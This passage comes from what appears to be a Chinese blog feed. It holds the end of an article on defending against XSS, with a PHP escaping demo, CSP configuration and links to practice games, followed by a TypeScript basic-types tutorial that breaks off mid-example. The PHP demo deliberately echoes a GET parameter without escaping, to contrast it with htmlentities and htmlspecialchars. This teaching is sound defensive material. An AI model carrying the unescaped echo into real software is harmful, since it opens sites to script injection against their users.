class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--api.php--&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    @$input = $_GET[&apos;param&apos;];</span><br><span class="line">    echo &quot;&lt;div&gt;.$input.&lt;/div&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;div&gt;&quot;.htmlentities($input).&quot;&lt;/div&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;div&gt;&quot;.htmlspecialchars($input).&quot;&lt;/div&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>注：<code>htmlentities</code>不指定编码的话遇到中文会乱码</p><p>在使用 <code>.innerHTML</code>、<code>document.write()</code>、<code>document.outerHTML</code> 这些能够修改页面结构的 API 时要注意防范恶意代码，尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等</p><h3 id="内容安全策略（CSP）"><a href="#内容安全策略（CSP）" class="headerlink" title="内容安全策略（CSP）"></a>内容安全策略（CSP）</h3><p><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">内容安全策略（Content Security Policy）</a>，实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，大大增强了网页的安全性。</p><p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的 Content-Security-Policy 的字段。</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">script-src</span> <span class="string">'self'</span>; </span><br><span class="line">                         <span class="keyword">object-src</span> <span class="string">'none'</span>;</span><br><span class="line">                         <span class="keyword">style-src</span> cdn.example.org iyouhun.com; </span><br><span class="line">                         <span class="keyword">child-src</span> https:</span><br></pre></td></tr></table></figure><p>另一种是通过网页的 <code>&lt;meta&gt;</code> 标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; object-src 'none'; style-src cdn.example.org iyouhun.com; child-src https:"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码中，CSP 做了如下配置。</p><ul><li><strong>脚本：</strong> 只信任当前域名</li><li><strong><code>&lt;object&gt;</code>标签：</strong> 不信任任何 URL，即不加载任何资源</li><li><strong>样式表：</strong> 只信任 cdn.example.org 和 iyouhun.com</li><li><strong>页面子内容，如 <code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>：</strong> 必须使用HTTPS协议加载</li><li><strong>其他资源：</strong> 没有限制</li></ul><p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>百度网盘：<a href="https://zhuanlan.zhihu.com/p/24249045" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/24249045</a></p><p>酷站：<a href="https://www.cnblogs.com/chyingp/archive/2013/06/06/zcool-xss.html" target="_blank" rel="noopener">https://www.cnblogs.com/chyingp/archive/2013/06/06/zcool-xss.html</a></p><h2 id="xss在线攻击小游戏"><a href="#xss在线攻击小游戏" class="headerlink" title="xss在线攻击小游戏"></a>xss在线攻击小游戏</h2><p><a href="https://alf.nu/alert1" target="_blank" rel="noopener">https://alf.nu/alert1</a></p><p><a href="http://prompt.ml/" target="_blank" rel="noopener">http://prompt.ml/</a></p><p><a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">https://xss-game.appspot.com/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是XSS&quot;&gt;&lt;a href=&quot;#什么是XSS&quot; class=&quot;headerlink&quot; title=&quot;什么是XSS&quot;&gt;&lt;/a&gt;什么是XSS&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;XSS（Cross Site Script）攻击是指黑客通过“HTML注入”篡改网页，插入恶
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端安全" scheme="//www.shen.ee/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="xss" scheme="//www.shen.ee/tags/xss/"/>
    
      <category term="xss跨站脚本攻击" scheme="//www.shen.ee/tags/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    
      <category term="xss防御" scheme="//www.shen.ee/tags/xss%E9%98%B2%E5%BE%A1/"/>
    
      <category term="xss原理" scheme="//www.shen.ee/tags/xss%E5%8E%9F%E7%90%86/"/>
    
      <category term="xss攻击" scheme="//www.shen.ee/tags/xss%E6%94%BB%E5%87%BB/"/>
    
      <category term="cookie劫持" scheme="//www.shen.ee/tags/cookie%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>TypeScript 常用类型</title>
    <link href="//www.shen.ee/article/32125.html"/>
    <id>//www.shen.ee/article/32125.html</id>
    <published>2022-06-16T04:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.005Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TypeScript-常用类型"><a href="#TypeScript-常用类型" class="headerlink" title="TypeScript 常用类型"></a>TypeScript 常用类型</h1><p>TypeScript 是 JS 的超集，TS 提供了 JS 的所有功能，并且额外的增加了：<strong>类型系统</strong></p><p><strong>JS 有类型</strong>（比如，number/string 等），但是 <strong>JS 不会检查变量的类型是否发生变化</strong>，而 TS 会检查</p><p>TypeScript 类型系统的主要优势：<strong>可以显示标记出代码中的意外行为，从而降低了发生错误的可能性</strong></p><h2 id="类型注解"><a href="#类型注解" class="headerlink" title="类型注解"></a>类型注解</h2><p>示例代码</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age: <span class="built_in">number</span> = <span class="number">18</span>;</span><br></pre></td></tr></table></figure><p>代码中<code>:number</code>就是类型注解</p><p><strong>类型注解约束了只能给该变量赋值该类型的值</strong></p><p>错误演示</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误原因：将 string 类型的值赋值给了 number 类型的变量，类型不一致</span></span><br><span class="line"><span class="keyword">let</span> age: <span class="built_in">number</span> = <span class="string">'18'</span>;</span><br></pre></td></tr></table></figure><h2 id="常用基础类型"><a href="#常用基础类型" class="headerlink" title="常用基础类型"></a>常用基础类型</h2><p>可以将 TS 中的常用基础类型分为两类</p><ol><li>JavaScript 已有类型<ul><li>原始类型： <strong><code>number/string/boolean/null/undefined/symbol</code></strong></li><li>对象类型：<strong><code>object</code></strong>(数组、对象、函数等)</li></ul></li><li>TypeScript 新增类型<ul><li>联合类型、自定义类型（类型别名）、接口、元祖、字面量类型、枚举、void、any 等</li></ul></li></ol><p>注意：原始类型在 TS 和 JS 中写法一致， 对象类型在 TS 中更加细化，每个具体对象都有自己的类型语法</p><h3 id="原始类型"><a href="#原始类型" class="headerlink" title="原始类型"></a>原始类型</h3><blockquote><p>特点：可完全按照 JavaScript 中的名称来书写</p></blockquote><p><strong><code>number/string/boolean/null/undefined/symbol</code></strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age: <span class="built_in">number</span> = <span class="number">18</span>;</span><br><span class="line"><span class="keyword">let</span> username: <span class="built_in">string</span> = <span class="string">'张三'</span>;</span><br><span class="line"><span class="keyword">let</span> isMerry: <span class="built_in">boolean</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> unique: Symbol = Symbol(<span class="string">'shuiruohanyu'</span>);</span><br></pre></td></tr></table></figure><h3 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h3><p>数组两种写法</p><ol><li><p><code>类型[]</code>写法， 如</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> userList: <span class="built_in">string</span>[] = [<span class="string">'John'</span>, <span class="string">'Bob'</span>, <span class="string">'Tony'</span>];</span><br><span class="line"><span class="keyword">let</span> peopleList: object[] = [&#123; name: <span class="string">'张三'</span>, age: <span class="number">18</span> &#125;];</span><br></pre></td></tr></table></figure></li><li><p>Array&lt;类型&gt;写法， 如</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user2List: <span class="built_in">Array</span>&lt;<span class="built_in">string</span>&gt; = [<span class="string">'John'</span>, <span class="string">'Bob'</span>, <span class="string">'Tony'</span>];</span><br><span class="line"><span class="keyword">let</span> people2List: <span class="built_in">Array</span>&lt;object&gt; = [&#123; name: <span class="string">'张三'</span>, age: <span class="number">18</span> &#125;];</span><br></pre></td></tr></table></figure></li></ol><h3 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h3><p>组中既有 number 类型，又有 string 类型，这个数组的类型应该如何写?</p><p>可以用<code>|</code>(竖线)分割多个类型， 如</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str: <span class="built_in">string</span> | <span class="built_in">number</span> = <span class="number">1</span>;</span><br><span class="line">str = <span class="string">'张三'</span>;</span><br></pre></td></tr></table></figure><p>如果数组中可以是字符串或者数字，则可以这么写</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr: <span class="built_in">Array</span>&lt;<span class="built_in">number</span> | <span class="built_in">string</span>&gt; = [<span class="number">1</span>, <span class="number">2</span>, <span class="string">'张三'</span>];</span><br></pre></td></tr></table></figure><h3 id="类型别名"><a href="#类型别名" class="headerlink" title="类型别名"></a>类型别名</h3><blockquote><p>当一个复杂类型或者联合类型过多或者被频繁使用时，可以通过类型别名来简化该类型的使用</p></blockquote><p>用法：<code>type</code> 名称 = 具体类型</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> CustomArray = <span class="built_in">Array</span>&lt;<span class="built_in">number</span> | <span class="built_in">string</span>&gt;;</span><br><span class="line"><span class="keyword">let</span> arr1: CustomArray = [<span class="number">1</span>, <span class="number">2</span>, <span class="string">'张三'</span>];</span><br></pre></td></tr></table></figure><p>以上代码中，<code>type</code>作为创建自定义类型的关键字</p><ul><li>类型别名可以使任意合法的变量名称</li><li>推荐大驼峰的命名写法</li></ul><h3 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h3><p>函数类型需要指的是 <code>函数参数</code>和<code>返回值</code>的类型，这里分为两种写法</p><ul><li>第一种： 单独指定参数，返回值类型</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 单独指定函数返回值和函数参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">num1: <span class="built_in">number</span>, num2: <span class="built_in">number</span></span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 指定变量形式的</span></span><br><span class="line"><span class="keyword">const</span> add2 = (num1: <span class="built_in">number</span>, num2: <span class="built_in">number</span>): <span class="function"><span class="params">number</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>第二种， 同时指定参数和返回值</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 同时指定参数和返回值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> CustomFunc = <span class="function">(<span class="params">num1: <span class="built_in">number</span>, num2: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> add3: CustomFunc = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意： 当函数作为表达式时，可以通过类似箭头函数形式的语法来为函数添加类型，这种形式<code>只适用于函数表达式</code></p><h4 id="void-类型"><a href="#void-类型" class="headerlink" title="void 类型"></a>void 类型</h4><p>当我们的函数定义为没有返回值的类型时，可用关键字<code>void</code>表示</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 没有返回值的函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> CustomFunc1 = <span class="function">(<span class="params">num1: <span class="built_in">string</span>, num2: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> combinStr: CustomFunc1 = <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;;</span><br></pre></td></tr></table></figure><p>如果一个函数没有返回值，此时，在 TS 的类型中，应该使用 <code>void</code> 类型</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> add4 = <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;;</span><br><span class="line"><span class="comment">// 如果什么都不写 表示add4函数的类型为void</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> add5 = (): <span class="function"><span class="params">void</span> =&gt;</span> &#123;&#125;;</span><br><span class="line"><span class="comment">// 这种写法明确指定返回值为void与上方的类型相同</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> add6 = (): <span class="function"><span class="params">undefined</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 如果指定返回值为undefined  return undefined</span></span><br></pre></td></tr></table></figure><h4 id="函数可选参数"><a href="#函数可选参数" class="headerlink" title="函数可选参数"></a>函数可选参数</h4><p>当我们定义函数时，有的参数可传可不传，这种情况下，可以使用 TS 的可选参数来指定类型</p><p>比如，在使用数组的<code>slice</code>方法时，我们可以直接使用<code>slice()</code> 也可以传入参数 <code>slice(1)</code> 也可以<code>slice(1,3)</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> slice = (start?: <span class="built_in">number</span>, end?: <span class="built_in">number</span>): <span class="function"><span class="params">void</span> =&gt;</span> &#123;&#125;;</span><br></pre></td></tr></table></figure><p><code>?</code> 表示该参数或者变量可传可不传</p><p>注意：<strong>可选参数只能出现在参数列表的最后</strong>， 即必须参数必须在可选参数之前</p><h3 id="对象类型"><a href="#对象类型" class="headerlink" title="对象类型"></a>对象类型</h3><p>JS 中的对象是由属性和方法组成的，TS 的对象类型是<strong>对象中属性和方法的描述</strong></p><p>写法</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果有多个属性 可以换行 去掉间隔符号</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> person3: &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  sayHello: <span class="built_in">Function</span>;</span><br><span class="line">&#125; = &#123;</span><br><span class="line">  name: <span class="string">'王五'</span>,</span><br><span class="line">  sayHello() &#123;&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>总结： 可是使用<code>{}</code>来描述对象结构</p><p>属性采用<code>属性名：类型</code>形式</p><p>函数可以采用 <code>方法名(): 返回值类型</code> 或者 <code>函数名: Function</code>（不指定返回值）的形式</p><h4 id="使用类型别名"><a href="#使用类型别名" class="headerlink" title="使用类型别名"></a>使用类型别名</h4><p>直接使用<code>{}</code>会降低代码可读性，不具有辨识度，更推荐使用类型别名添加对象类型</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> PersonObj = &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  sayHello(): <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p1: PersonObj = &#123;</span><br><span class="line">  name: <span class="string">'高大大'</span>,</span><br><span class="line">  sayHello() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="带有参数的方法的类型"><a href="#带有参数的方法的类型" class="headerlink" title="带有参数的方法的类型"></a>带有参数的方法的类型</h4><p>如果对象中的函数带有参数，可以在函数中指定参数类型</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 带参数的函数方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> PersonObj2 = &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  sayHello(start: <span class="built_in">number</span>): <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2: PersonObj2 = &#123;</span><br><span class="line">  name: <span class="string">'高大大'</span>,</span><br><span class="line">  sayHello(start) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="箭头函数形式的方法类型"><a href="#箭头函数形式的方法类型" class="headerlink" title="箭头函数形式的方法类型"></a>箭头函数形式的方法类型</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 箭头函数形式定义类型</span></span><br><span class="line"><span class="keyword">type</span> People = &#123;</span><br><span class="line">  sayHello: <span class="function">(<span class="params">start: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> p3: People = &#123;</span><br><span class="line">  sayHello() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="对象可选属性"><a href="#对象可选属性" class="headerlink" title="对象可选属性"></a>对象可选属性</h4><p>对象中的若干属性，有时也是可选的，此时我们依然可以使用<code>?</code>来表示</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Config = &#123;</span><br><span class="line">  method?: <span class="built_in">string</span>;</span><br><span class="line">  url: <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> func = <span class="function">(<span class="params">config: Config</span>) =&gt;</span> &#123;&#125;;</span><br><span class="line">func(&#123; url: <span class="string">'/a'</span> &#125;);</span><br></pre></td></tr></table></figure><h3 id="接口-interface"><a href="#接口-interface" class="headerlink" title="接口 interface"></a>接口 interface</h3><p>当一个对象类型被多次使用时，一般使用接口（interface）描述对象的类型，达到复用的目的</p><ul><li>我们使用<code>interface</code>关键字来声明接口</li><li>接口名称推荐以<code>I</code>为开头</li><li>声明接口之后，直接使用接口名称作为变量的类型</li></ul><blockquote><p>接口后不需要分号</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 接口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> IPeople &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  age: <span class="built_in">number</span>;</span><br><span class="line">  sayHello(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p: IPeople = &#123;</span><br><span class="line">  name: <span class="string">'老高'</span>,</span><br><span class="line">  age: <span class="number">18</span>,</span><br><span class="line">  sayHello() &#123;&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="接口和自定义类型的区别"><a href="#接口和自定义类型的区别" class="headerlink" title="接口和自定义类型的区别"></a>接口和自定义类型的区别</h4><p>相同点：都可以给对象指定类型</p><p>不同点： 接口只能为对象指定类型， 类型别名可以为任意类型指定别名</p><ul><li>推荐用 type 来定义</li></ul><h4 id="接口继承"><a href="#接口继承" class="headerlink" title="接口继承"></a>接口继承</h4><ul><li>如果两个接口之间有相同的属性和方法，可以讲<strong>公共的属性和方法抽离出来，通过继承来实现复用</strong></li></ul><p>比如，这两个接口都有 x、y 两个属性，重复写两次，可以，但很繁琐</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Point2D &#123;</span><br><span class="line">  x: <span class="built_in">number</span>;</span><br><span class="line">  y: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Point3D &#123;</span><br><span class="line">  x: <span class="built_in">number</span>;</span><br><span class="line">  y: <span class="built_in">number</span>;</span><br><span class="line">  z: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>更好的方式</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Point2D &#123; x: <span class="built_in">number</span>; y: <span class="built_in">number</span> &#125;</span><br><span class="line"><span class="keyword">interface</span> Point3D <span class="keyword">extends</span> Point2D &#123;</span><br><span class="line">    z: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用<code>extends</code>关键字实现了 Point3D 继承了 Point2D 的所有属性的定义， 同时拥有继承的属性和自身自定义的属性</p><h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><p>当我们想定义一个数组中具体索引位置的类型时，可以使用元祖。</p><blockquote><p>原有的数组模式只能宽泛的定义数组中的普遍类型，无法精确到位置</p></blockquote><p>元组是另一种类型的数组，它确切知道包含多少个元素，以及特定索引对应的类型</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> position: [<span class="built_in">number</span>, <span class="built_in">number</span>] = [<span class="number">39.5427</span>, <span class="number">116.2317</span>];</span><br></pre></td></tr></table></figure><h3 id="类型推论"><a href="#类型推论" class="headerlink" title="类型推论"></a>类型推论</h3><p>在 TS 中，某些没有明确指出类型的地方，<strong>TS 的类型推论机制会帮助提供类型</strong></p><p>也就是说，由于类型推论的存在，在某些地址类型注解可以省略不写。</p><ul><li>发生类型推论的常见场景</li></ul><ol><li>声明变量并初始化时</li><li>决定函数返回值时</li></ol><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 变量creater_name自动被推断为 string</span></span><br><span class="line"><span class="keyword">let</span> creater_name = <span class="string">'gaoly'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数返回值的类型被自动推断为 number</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addCount</span>(<span class="params">num1: <span class="built_in">number</span>, num2: <span class="built_in">number</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>推荐：<strong>能省略类型注解的地方就省略</strong>（<del>偷懒</del>，充分利用 TS 类型推论的能力，提升开发效率）</p><p>技巧：如果不知道类型，可以通过鼠标放在变量名称上，利用 VSCode 的提示来查看类型</p><h3 id="字面量类型"><a href="#字面量类型" class="headerlink" title="字面量类型"></a>字面量类型</h3><blockquote><p>下面的代码类型分别是什么？</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字面量类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> str1 = <span class="string">'张三'</span>;</span><br><span class="line"><span class="keyword">const</span> str2 = <span class="string">'张三'</span>;</span><br></pre></td></tr></table></figure><p>通过 TS 的类型推导可以得到答案</p><p>1.变量 str1 的变量类型为： string</p><p>2.变量 str2 的变量类型为 ‘张三’</p><p>解释：str1 是一个变量(let)，它的值可以是任意字符串，所以类型为:string</p><p>str2 是一个常量(const)，它的值不能变化只能是 ‘张三’，所以，它的类型为:’张三’</p><p>此时，‘张三’就是一个<strong>字面量类型</strong>，即某个特殊的字符串也可以作为 TS 中的类型</p><p>任意的 JS 字面量（对象，数组，数字）都可以作为类型使用</p><h4 id="使用场景和模式"><a href="#使用场景和模式" class="headerlink" title="使用场景和模式"></a>使用场景和模式</h4><ul><li>使用模式：<strong>字面量类型配合联合类型一起使用</strong></li><li>使用场景：用来表示一组明确的可选值列表</li><li>比如，在贪吃蛇游戏中，游戏的方向的可选值只能是上、下、左、右中的任意一个</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Direction = <span class="string">'left'</span> | <span class="string">'right'</span> | <span class="string">'up'</span> | <span class="string">'down'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用自定义类型:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeDirection</span>(<span class="params">direction: Direction</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(direction);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数时，会有类型提示：</span></span><br><span class="line">changeDirection(<span class="string">'up'</span>);</span><br></pre></td></tr></table></figure><ul><li>解释：参数 direction 的值只能是 up/down/left/right 中的任意一个</li><li>优势：相比于 string 类型，使用字面量类型更加精确、严谨</li></ul><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><ul><li>枚举的功能类似于<strong>字面量类型+联合类型组合</strong>的功能，也可以表示一组明确的可选值</li><li>枚举：定义一组命名常量。它描述一个值，该值可以是这些命名常量中的一个</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span 